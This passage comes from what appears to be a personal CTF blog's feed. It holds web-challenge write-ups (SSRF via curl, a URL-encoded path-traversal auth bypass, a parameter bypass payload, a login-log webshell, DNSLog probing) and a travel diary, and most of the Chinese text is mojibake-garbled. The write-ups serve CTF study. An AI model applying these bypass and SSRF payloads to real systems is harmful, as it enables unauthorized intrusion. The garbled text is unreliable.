preg_match(<span class="string">&quot;/file|dict/i&quot;</span>, <span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ssrf æ‰“ admin.phpï¼š<code>?url=http://121.36.147.29:20001/admin.php</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é“ä¸‰çº¿ä¸‹ä¹‹æ—…</title>
      <link href="2021/05/07/%E9%93%81%E4%B8%89%E7%BA%BF%E4%B8%8B%E4%B9%8B%E6%97%85/"/>
      <url>2021/05/07/%E9%93%81%E4%B8%89%E7%BA%BF%E4%B8%8B%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>èººèººè¿›äº†é“ä¸‰çº¿ä¸‹ï¼Œæ¥å®‰å¾½æ—…ä¸€æ³¢æ¸¸ã€‚</p><h2 id="5-7"><a href="#5-7" class="headerlink" title="5.7"></a>5.7</h2><p><img src="https://i.loli.net/2021/05/07/BURJi9TtfVCajkA.jpg"></p><p>ä»Šå¤©åœ¨å®éªŒå®¤ä¸€ç›´å¾…åˆ°å‡Œæ™¨ï¼Œå«äº†æ»´æ»´è·‘åˆ°é•¿æ²™ç«è½¦ç«™ï¼Œåç»¿çš®ç«è½¦å»æ­¦æ˜Œï¼Œå§é“ºå—·ï¼Œå§é“ºï¼Œä»¤äººæ˜¯æ— æ¯”æœŸå¾…ï¼Œæˆ‘ä»¬æ‰€æœŸå¾…çš„æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://i.loli.net/2021/05/07/fFlIXD4iHEN89Ah.png"></p><p>ç„¶åâ€¦â€¦ç°å®æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://i.loli.net/2021/05/07/1Tr8ceGIbfA4quZ.jpg"></p><p>è¿˜å°±å†…ä¸ªä¸‰å±‚å§é“ºï¼Œé¡¶çº§æŠ˜ç£¨ï¼Œå—·ï¼Œä½åœ¨ä¸­å±‚çš„ğŸ‘´åªèƒ½èººç€è¿›å»èººç€å‡ºæ¥ã€‚ä¸ŠåºŠå·²ç»å·®ä¸å¤šæ˜¯å‡Œæ™¨ä¸‰ç‚¹åŠäº†å§ï¼Œéƒ½æ²¡å’‹ç¡ï¼ŒæŠ˜è…¾åˆ°äº†å››ç‚¹å¤šæ‰é—­çœ¼ï¼Œç¡äº†å¤§æ¦‚ä¸¤ä¸ªå°æ—¶å°±è¢«ä¹˜åŠ¡å‘˜å–Šèµ·æ¥äº†ï¼Œè¯´æ˜¯è¿˜æœ‰äºŒååˆ†é’Ÿå°±åˆ°äº†ï¼Œå°±ä¸‹äº†åºŠï¼Œç›´æ¥è·Ÿæ²¡ç¡ä¸€æ ·ï¼Œç„¶åä¸­é—´è¿˜åœäº†ä¸€æ®µæ—¶é—´ï¼Œå°±æ™šç‚¹äº†ï¼Œå·®ç‚¹èµ¶ä¸ä¸Šå…«ç‚¹çš„ä»æ­¦æ±‰ç«™åˆ°åˆè‚¥çš„é«˜é“ğŸšï¼ˆæ€»å½’æ˜¯èµ¶ä¸Šäº†ã€‚</p><p><img src="https://i.loli.net/2021/05/07/9z2tj4CQFDwYrLx.jpg" alt="ã€"></p><p><img src="https://i.loli.net/2021/05/07/srwOyI1MpS4viAq.jpg"></p><p>è¿™ä¸¤å›¾éƒ½åœ¨ç«è½¦ä¸Šæ‹çš„ã€‚</p><p>é«˜é“ä¸Šé¢ä¸€æ²¡é çª—ï¼ŒäºŒå°±å¤ªå›°äº†ğŸ˜´ï¼Œæ‰€ä»¥å•¥éƒ½æ²¡æ‹ï¼Œç›´æ¥é—­ç›®å…»ç¥äº†ä¸€è·¯ã€‚å¤§æ¦‚ä¹ç‚¹å¤šæ€»ç®—æ˜¯åˆ°äº†åˆè‚¥ã€‚</p><p><img src="https://i.loli.net/2021/05/07/Wb5EXg8K24L7lHQ.jpg"></p><p>æŸè›®å¥½çœ‹çš„å»ºç­‘ï¼š</p><p><img src="https://i.loli.net/2021/05/07/Kpa2yBlVfnsF7kJ.jpg"></p><p>ç‚¹åæ‰¹è¯„è¿™é‡Œçš„è€é¸¡æ±¤é¢ï¼Œå¤ªéš¾åƒäº†ï¼Œæµªè´¹ğŸ‘´23å—ğŸ’°ï¼Œå“­å“­ã€‚</p><p>ä½çš„é…’åº—å’Œæ¯”èµ›é…’åº—è¿˜æ˜¯æ¯”è¾ƒè¿‘ï¼Œä¹Ÿå°±éš”å£çš„å…³ç³»å§23333ã€‚</p><p><img src="https://i.loli.net/2021/05/07/5BgLtizdpVSNuWT.jpg"></p><p><img src="https://i.loli.net/2021/05/07/XKIhZwjL7vGJOPR.jpg"></p><p>ä¸‹åˆæ‰“ç®—å»æ¬¢ä¹è°·ç©ç©ï¼Œå½³äºã€‚</p><p>ç¬‘æ­»ï¼Œè¿™ä»¨ä¸ªäººä¸€ä¸ªéƒ½æ²¡èµ·æ¥ï¼Œç©ä¸ªğŸ“å„¿ã€‚</p><p>æ™šä¸Šå»åƒäº†ğŸ‘´åƒè¿‡çš„æœ€éš¾åƒæœ€å‘ğŸ’°çš„çƒ§çƒ¤åº—ï¼Œç¬¬ä¸€æ¬¡å°åˆ°äº†æœ€éš¾åƒçš„ğŸŒ¶ç‚’ğŸ¥©ï¼Œæœ€éš¾åƒçš„ğŸ‚ğŸ¥©ï¼Œæœ€éš¾åƒçš„ğŸ³ç‚’é¥­ï¼Œå±å®ç»™ğŸ‘´æ•´åäº†ï¼Œæ•¢æƒ…ğŸ‘´æ˜¯æ¥æ’é›·çš„å‘—ã€‚</p><p>åƒå®Œæ™šé¥­æ•£æ­¥çš„æ—¶å€™æ‰å‘ç°ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼ŒğŸ‘´å¿˜è®°å¸¦ç½‘çº¿è½¬æ¥å¤´äº†ã€‚ã€‚ã€‚so åˆ°å¤„æºœè¾¾ï¼Œè¯•å›¾åœ¨æ‰‹æœºä¸“å–åº—é‡Œé¢ä¹°åˆ°ç”µè„‘çš„ç½‘çº¿è½¬æ¥å¤´ï¼ˆè¯¯ï¼‰ï¼Œæœ€åæ‰¾åˆ°äº†æŸè”æƒ³ï¼Œç›´æ¥ -249ï¼ˆå“­æƒ¨ï¼‰ã€‚ï¼ˆå…³é”®å‰ä¸¤æ¬¡çº¿ä¸‹ä¹Ÿå¿˜äº†å¸¦ï¼Œä¸é•¿è®°æ€§å•Šè¿™äººï¼‰</p><p><img src="https://i.loli.net/2021/05/07/qlVk3zpOWK4XvCx.jpg"></p><p>å”¯ä¸€èƒ½å¸¦æ¥ä¸€ç‚¹æ…°ç±çš„å°±æ˜¯å°ğŸ·äº†ï¼š</p><p><img src="https://i.loli.net/2021/05/07/dS3NfzvsVx2heDc.jpg"></p><p>å‡†å¤‡çœ‹çœ‹æº¯æºå’Œæ¸—é€ï¼Œå¸Œæœ›æ˜å¤©åˆ«çˆ†é›¶å§ - -</p><p>Good nightğŸŒ™</p><h2 id="5-8"><a href="#5-8" class="headerlink" title="5.8"></a>5.8</h2><p>å¾½é¢ã€‚</p><p><img src="https://i.loli.net/2021/05/08/nFhWkYlSZdygRLT.jpg"></p><p>å½¢çŠ¶è¿˜æŒºé€†å¤©çš„ï¼Œå£æ„Ÿè¿˜å½³äºï¼Œåªæ˜¯æ²¡æœ‰ç¢±é¢å¥½åƒã€‚</p><p><img src="https://i.loli.net/2021/05/08/coLfFjgVw57xmlR.jpg"></p><p>å¤§æ¦‚å…«ç‚¹è¿›èµ›åœºäº†ã€‚</p><p><img src="https://i.loli.net/2021/05/08/kQ9FgopdP4hrvEC.jpg"></p><p><img src="https://i.loli.net/2021/05/08/va3lRrcE8LXZPJt.jpg"></p><p>ä¸­é—´æ¯”èµ›çš„è¿‡ç¨‹è¿˜æŒºè‰°è¾›çš„ï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼ŒçŸ¥é“äº†æº¯æºå¹¶ä¸æ˜¯æƒ³è±¡ä¸­çš„é‚£ä¹ˆéš¾ï¼Œæœ€åæ˜¯ç¬¬åä¸€åï¼Œè¿˜å¯ä»¥ï¼Œå›æœ¬äº†ï¼Œå°èµšã€‚</p><p>ä¸­é¥­éƒ½æ²¡åƒ = =ï¼Œå¾ˆé¥¿ï¼Œå¾…ä¼šåƒé¡¿å¥½çš„ï¼Œæ™šä¸Šå‡ºå»è½¬ä¸€è½¬ã€‚</p><p>å®åœ¨æ„Ÿè°¢ @è€æ¨Š @å“å“¥ @è€è°¢ ä½ ä»¬å¸¦æˆ‘èººã€‚</p><p><img src="https://i.loli.net/2021/05/08/yDwPXVYSv9QKGkt.jpg"></p><p>ç„¶åè¿˜å’Œ @Guoke å¸ˆå‚…é¢äº†ä¸ªåŸºï¼Œguoke å¤ªå¸…äº†ï¼ˆè¯¯ã€‚</p><p>åœ¨ä¹‹åå°±å»äº†æ®è¯´æ˜¯åˆè‚¥äººéƒ½å’‹å’‹å’‹çš„åºå·å¤ªå¤ªåƒæ™šé¥­ã€‚</p><p><img src="https://i.loli.net/2021/05/08/eavzXKdZix4Aj1l.jpg"></p><p><img src="https://i.loli.net/2021/05/08/W1mxOSXudEA6siw.jpg"></p><p><img src="https://i.loli.net/2021/05/08/v8TWqiwfB69AjnK.jpg"></p><p>è™½ç„¶ç¡®å®èŠ±äº†æ¯”æ˜¨æ™šå°‘çš„ğŸ’´ï¼Œåƒåˆ°äº†æ˜¨æ™šå¥½åƒå¤ªå¤šçš„é¥­èœï¼Œä½†æ˜¯è¿™å±Œé¥­åº—çš„ä¸Šèœé€Ÿåº¦ç¡®å®æŠ˜ç£¨äººï¼Œèœè¿˜æ²¡ä¸Šé½å°±å·®ä¸å¤šé¥±äº†ï¼ˆæ¼ã€‚</p><p>å®Œäº‹ä»¥åé€›äº†ä¸€æ³¢å•†åœºï¼Œè¯´æ˜¯è¦ä¹°å¥½åƒçš„å•¥çš„ï¼Œè¿˜æœ‰å¸½å­ï¼Œæœ€åå°±æˆ‘å’Œè€è°¢ä¸€äººä¹°äº†ä¸€åªğŸ·ã€‚</p><p><img src="https://i.loli.net/2021/05/08/gAIe1xqnvSfBY4W.jpg"></p><p>å½³äºï¼Œå›é…’åº—ä¼‘æ¯äº†ï¼ŒåºŠå¤ªèˆ’æœäº†ã€‚</p><h2 id="5-9"><a href="#5-9" class="headerlink" title="5.9"></a>5.9</h2><p>ä¸€è§‰ç¡åˆ° 10 ç‚¹ï¼Œå¦‚æœä¸æ˜¯æœ‰æ¯”èµ›è¿˜å¯ä»¥ç»§ç»­ç¡ğŸ›ã€‚</p><p>è€æ¨Šè€è°¢ç›´æ¥è·‘å‡ºå»ç©å»äº†ï¼Œå’Œå“å“¥æ‰“åˆ°å¿«ä¸¤ç‚¹çš„æ—¶å€™å»åƒäº†é¡¿é¥­ï¼Œåˆä¸ä¿¡é‚ªå»åƒäº†æ¬¡ç¬¬ä¸€å¤©åƒçš„åº—å­ã€‚</p><p><img src="https://i.loli.net/2021/05/09/KIlSPANmgEZzRp7.jpg"></p><p>å¥½çœ‹æ˜¯æŒºå¥½çœ‹ï¼Œä½†æ˜¯å°±æ˜¯å°‘äº†å‘³é“ï¼ˆçƒ¦æ­»äº†ã€‚</p><p>ä¸‹åˆç»§ç»­å‘å¾®åšé¢˜ï¼Œä¸€ä¸ªäººæ‰“ä¸¤åœºæ¯”èµ›ï¼ˆé˜Ÿå‹å‘¢ï¼Œæ•‘æ•‘å•Šï¼Œåˆ«æ¼”äº†ã€‚</p><p>åƒäº†éš”å£çš„è€ä¹¡é¸¡ï¼Œå¾ˆç¦»è°±çš„æ˜¯ä¸€å †äººå¯¹ç€å¯¼èˆªåŠå¤©ï¼Œéƒ½è¯´æ˜æ˜åˆ°äº†ï¼ˆæŒ‡è‡ªå®¶é…’åº—é—¨å£ï¼‰ï¼Œä¸ºä»€ä¹ˆæ²¡æ‰¾åˆ°ï¼Œè½¬å¤´ä¸€çœ‹å°±åœ¨éš”å£ï¼ˆçã€‚</p><p><img src="https://i.loli.net/2021/05/09/3H6vYGFci2TEnmL.jpg"></p><p><img src="https://i.loli.net/2021/05/09/FimjJQ7zeslVZCI.jpg"></p><p>äººæ‰‹ä¸€ç“¶è¥å…»å¿«çº¿ï¼Œå¹²~</p><p><img src="https://i.loli.net/2021/05/09/thF9MNdV6IDXRCv.jpg"></p><p>ç„¶åç¬¬äºŒè½®ï¼Œå—¦é¢ï¼ˆä»€ä¹ˆå«ä¸Šå½“ï¼Œå†ä¹Ÿä¸ä¼šåƒå¾½é¢äº†ï¼Œæˆ‘ä¸è¯¥å¯¹å¾½é¢æœ‰è¿™æ ·çš„ä¿¡å¿ƒã€‚&lt;ä»…ä»£è¡¨ä¸ªäººè§‚ç‚¹&gt;</p><p><img src="https://i.loli.net/2021/05/09/OPYVjdyR4pTGbH8.jpg" alt="@4PF9_N_O_GASGI_V_APZF5.jpg"></p><p>è¡¨æƒ…åŒ…æ€ä¹ˆè¯´ï¼Œå¤ºç¬‹å•Šã€‚</p><p><img src="https://i.loli.net/2021/05/09/CPaSnvAGditTp5u.jpg"></p><p>åƒå®Œå’Œè€è°¢éª‘å°ç”µåŠ¨åˆ°å¤„ä¹±è½¬ï¼Œå¾ˆèˆ’æœï¼Œç¬¬ä¸€æ¬¡éª‘ï¼Œç›´æ¥èµ·é£ã€‚</p><p><img src="https://i.loli.net/2021/05/09/dFUmtri58buJ6Io.jpg"></p><p>å›æ¥è¶´åºŠä¸Šçœ‹äº†ä¸€æ³¢é¬¼ç­ï¼Œèˆ’æœä¹‹ï¼ˆåªèƒ½è¯´æˆ‘å¤ªæ¬£èµå–„é€¸çš„é¢œäº†ã€‚</p><p><img src="https://i.loli.net/2021/05/09/z9f3gqNZ6rjpcvh.jpg"></p><p><img src="https://i.loli.net/2021/05/09/C9p4GjevUO6q8Fm.jpg"></p><p>æ˜å¤©æ‰“ç®—å»å¤–é¢è½¬ä¸€è½¬ï¼Œæ”¾æ¾æ”¾æ¾ï¼Œä¼‘æ¯äº†ä¼‘æ¯äº†ã€‚</p><h2 id="5-10"><a href="#5-10" class="headerlink" title="5.10"></a>5.10</h2><p>å»æ¸¸ä¹åœºç©äº†åŠå¤©ï¼Œå¾ˆä»–ğŸçˆ½ï¼Œåç«è½¦å›äº†ï¼Œè´´å¼ è¡¨æƒ…åŒ…ï¼Œæºœäº†æºœäº†ã€‚</p><p><img src="https://i.loli.net/2021/05/11/mHoKCj98rXGP4xz.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
            <tag> æ—…æ¸¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_CSTC_WP</title>
      <link href="2021/05/06/2021-CSTC-WP/"/>
      <url>2021/05/06/2021-CSTC-WP/</url>
      
        <content type="html"><![CDATA[<p>äº”ä¸€å‡æœŸç»“æŸå¤ªå¿«äº†ï¼Œæ—©ä¸Šèµ·æ¥æƒ³å·æ‡’ç¡è§‰è¢« @LemonPrefect å¸ˆå‚…æ‹–èµ·æ¥åšé¢˜ï¼Œä¸­åˆæƒ³ç¡åˆè§‰è¢« @Guoke å¸ˆå‚…æ‹–èµ·æ¥åšé¢˜ï¼Œæœ€åæ˜¯å’Œå¸ˆå‚…ä»¬ä¸€èµ· A äº†å››é“ webï¼ˆguoke å¤ªçŒ›äº†ï¼‰ï¼Œæ™šä¸Šå‡ºå»äº†æœ€åæ²¡æ¥å¾—åŠåš web5ï¼Œéšä¾¿è´´è´´å½“æ—¶è®°å½•çš„æ–‡æ¡£å§ï¼Œå¥½åƒä¹Ÿæ²¡æœ‰å¤ç°äº†ã€‚</p><h2 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h2><p>ç®€å•çš„ç»•è¿‡ï¼Œpayloadï¼š</p><p><code>?foo=&#123;&quot;bar1&quot;:&quot;2022a&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=%00cstc2021&amp;cat[1]=1&amp;dog[]=%00</code></p><h2 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h2><p><code>http://49.232.167.183:30013/swagger-resources/configuration/ui</code></p><p>å¥½åƒæ˜¯è¿™ä¸ªåœ°æ–¹å§ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰è·¯ç”±ï¼Œæœ‰ä¸ªçˆ†ç ´UIDçš„æ¥å£ã€‚é€šè¿‡çˆ†ç ´UIDã€‚å¾—åˆ°900å¤šçš„ä¸€ä¸ªctf_adminè´¦å·ä»¥åŠå¯†ç md5è§£å¯†å¾—åˆ°ctfer123!@#</p><p><code>curl -X GET &quot;http://49.232.167.183:30012/login?username=ctf_admin&amp;password=ctfer123!%40%23&quot;</code></p><p>è·å¾— tokenï¼š9c618e664319512ef7db2d3c0672bee0</p><p>ç„¶å ssrf è®¿é—® <code>ftp://localhost/flag.txt</code> å¾—åˆ°flagã€‚</p><h2 id="ctfweb3"><a href="#ctfweb3" class="headerlink" title="ctfweb3"></a>ctfweb3</h2><p>è®¿é—® robots.txtï¼Œå­˜åœ¨ <code>/PassOn/</code>ï¼Œæºç æ³„éœ²ï¼š</p><p><code>http://49.232.3.115:49400/PassOn/PassOnbackupDirect0ry/info.php</code></p><p>style.css ä¸­å‘ç°ç”¨æˆ· Ptn4rdn <a href="mailto:&#x50;&#116;&#x6e;&#52;&#x72;&#100;&#x6e;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#x6d;">&#x50;&#116;&#x6e;&#52;&#x72;&#100;&#x6e;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#x6d;</a></p><p>reset ç”³è¯·æ”¹ä¸€ä¸‹å¯†ç ï¼Œlogin å†™ğŸï¼Œç„¶åè®¿é—®æ—¥å¿—å®Œäº‹ã€‚</p><h2 id="hackerweb"><a href="#hackerweb" class="headerlink" title="hackerweb"></a>hackerweb</h2><p>å­˜åœ¨ /login è·¯ç”±ï¼Œjava é¢˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">registry.addInterceptor(handlerInterceptor())</span><br><span class="line">.addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> HandlerInterceptor <span class="title">handlerInterceptor</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> PermissionInterceptor();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PermissionInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">String uri = request.getRequestURI();</span><br><span class="line">uri = uri.replaceAll(<span class="string">&quot;//&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;RequestURI: &quot;</span> + uri);</span><br><span class="line"><span class="keyword">if</span> (uri.contains(<span class="string">&quot;..&quot;</span>) || uri.contains(<span class="string">&quot;./&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (uri.startsWith(<span class="string">&quot;/login&quot;</span>) || uri.startsWith(<span class="string">&quot;/index&quot;</span>) || uri.startsWith(<span class="string">&quot;/image&quot;</span>) || uri.startsWith(<span class="string">&quot;/css&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ <code>POST /login/%2e%2e/%61%64%6d%69%6e</code> ç»•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username&#x3D;admin&amp;Password&#x3D;admin</span><br></pre></td></tr></table></figure><p>å‘ç° domain &amp; secertï¼Œè¿™é‡Œçº ç»“äº†å¾ˆä¹…ã€‚</p><p><img src="https://i.loli.net/2021/05/06/OILkxSRHgavoXc5.png"></p><p>domain å¤„ä¼  dns è¯•è¯•ï¼Œå›æ˜¾ 127.0.0.1ï¼ŒåŒæ—¶ dnslog ä¹Ÿæœ‰äº†å›æ˜¾ï¼š</p><p><img src="https://i.loli.net/2021/05/06/hrvM6FaG8oXdb9k.png"></p><p>æ€»å…±å¤§æ¦‚æ˜¯è¿™å››ä¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ea197db0 bf03c5f3 8841a402 75aaaf2e</span><br></pre></td></tr></table></figure><p>secert å¤„æ’åˆ—ç»„åˆäº¤ä¸€ä¸‹ flag å°±å‡ºäº†ã€‚</p><hr><p>é¡ºå¸¦ä¸€æï¼Œè¿™é‡Œæ˜¯å‡ºé¢˜äººè‹±è¯­æ¯”ğŸ‘´è¿˜å·®ï¼Œæ‰“é”™å•è¯äº†ï¼ˆsecert -&gt; secret</p><h2 id="superadmin"><a href="#superadmin" class="headerlink" title="superadmin"></a>superadmin</h2><p>register å¤„ sql æ³¨å…¥ï¼Œè¿˜æ²¡åšå‡ºæ¥ï¼Œç­‰ä¸€æ³¢èµ›å wp å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_PYCC_WEB5_WP</title>
      <link href="2021/05/04/2021-PYCC-WEB5-WP/"/>
      <url>2021/05/04/2021-PYCC-WEB5-WP/</url>
      
        <content type="html"><![CDATA[<p>çœ‹äº†çœ‹è¿™é“é¢˜ï¼Œå¥½åƒè¿˜è›®æœ‰æ„æ€çš„ã€‚ã€‚ã€‚pycc åæ­£ä¸ç”¨å¤šè¯´ï¼Œå¬å¸ˆå‚…è¯´è¿™é“é¢˜ 509 è§£ï¼Œå“ˆå“ˆå“ˆã€‚</p><hr><p>æ€ªæ¶å¿ƒçš„ï¼Œå’Œ @s1mple å¸ˆå‚…è®¨è®ºäº†åŠå¤©ï¼Œæ¶å¿ƒç¿»å€ã€‚</p><h2 id="which-is-the-true-iscc"><a href="#which-is-the-true-iscc" class="headerlink" title="which is the true iscc"></a>which is the true iscc</h2><p>è´´ä¸€ä¸‹æºç å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span 